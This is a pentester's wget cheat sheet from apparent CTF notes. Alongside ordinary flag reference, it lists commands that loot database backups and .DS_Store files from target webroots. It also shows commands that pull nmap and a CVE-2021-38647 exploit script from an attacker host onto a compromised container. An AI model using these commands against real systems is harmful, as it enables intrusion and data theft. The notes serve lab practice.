# wget

Non-interactive HTTP(S) / FTP downloader. Default choice for pulling a single URL (or a small known list of URLs) from the target's webroot — faster than `curl -O` for many files, and recurses cleanly when needed.

Used on: **LazyAdmin**, **Yueiua**, **Oh My Web**, **Vulnversity**, **BSides GT develpy**

## Commands Used

### Single-file download
```bash
wget http://$TARGET/content/inc/cache/cache.db                         # [USED — LazyAdmin]
wget http://$TARGET/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql   # [USED — LazyAdmin]
wget http://$TARGET/content/as/lib/app_sqlite.sql                      # [USED — LazyAdmin]
wget http://$TARGET/content/as/lib/app_pgsql.sql                       # [USED — LazyAdmin]

wget http://$TARGET/assets/images/oneforall.jpg                        # [USED — Yueiua, fed steghide]
```

### Drop a static binary into a stripped container (when curl is missing)
```bash
wget http://$LHOST/nmap -O /tmp/nmap && chmod +x /tmp/nmap             # [USED — ohmyweb]
wget http://$LHOST/CVE-2021-38647.py -O /tmp/exploit.py                # [USED — ohmyweb]
```
Companion to the static-binary pivot: see [container-network-pivoting.md](../../exploits/container/container-network-pivoting.md).

### `.DS_Store` bulk loot
```bash
mkdir ds_store && cd ds_store
wget http://$TARGET/.DS_Store
wget http://$TARGET/assets/.DS_Store
wget http://$TARGET/assets/js/.DS_Store
wget http://$TARGET/assets/images/.DS_Store
wget http://$TARGET/assets/images/shape/.DS_Store                      # [USED — ohmyweb]
```
Parse offline with `python3 -m ds_store <file>` — see [ds-store-disclosure.md](../../exploits/web-disclosure/ds-store-disclosure.md).

### Rename on save
```bash
wget -O shell.php http://$TARGET/path/to/remote.php
```

### Preserve full directory layout
```bash
wget -x http://$TARGET/content/inc/cache/cache.db
# ? creates ./<TARGET>/content/inc/cache/cache.db
```

### Recursive mirror (when feroxbuster gave a tree)
```bash
wget -r -np -nH --cut-dirs=1 http://$TARGET/backups/
```
| Flag | Meaning |
|------|---------|
| `-r` | recursive |
| `-np` | no-parent (don't ascend) |
| `-nH` | no-host-directories |
| `--cut-dirs=N` | strip N leading directories |

### Silence output (useful in scripts)
```bash
wget -q http://$TARGET/file -O file
```

### POST request
```bash
wget --method=POST --body-data='foo=bar' http://$TARGET/endpoint
```

### Ignore TLS errors (self-signed certs)
```bash
wget --no-check-certificate https://$TARGET/file
```

### Batch from a URL list
```bash
wget -i urls.txt
```

### Background / resumable downloads
```bash
wget -c http://$TARGET/big.iso         # resume partial
wget -b http://$TARGET/big.iso         # run in background
```

## wget vs curl

| Situation | Tool |
|-----------|------|
| Single file from a known URL | either; `wget` is shorter |
| Mirror a tree | `wget -r` |
| Scripting an HTTP interaction (JSON, headers, body capture) | `curl` |
| Resume interrupted transfer | `wget -c` |
| On a foothold shell (often no wget installed) | `curl` is more commonly present |

## Related
- [curl](curl.md) — HTTP power tool for active exploitation
- [backup-file-exposure.md](../../exploits/web-disclosure/backup-file-exposure.md) — classic use case on web targets


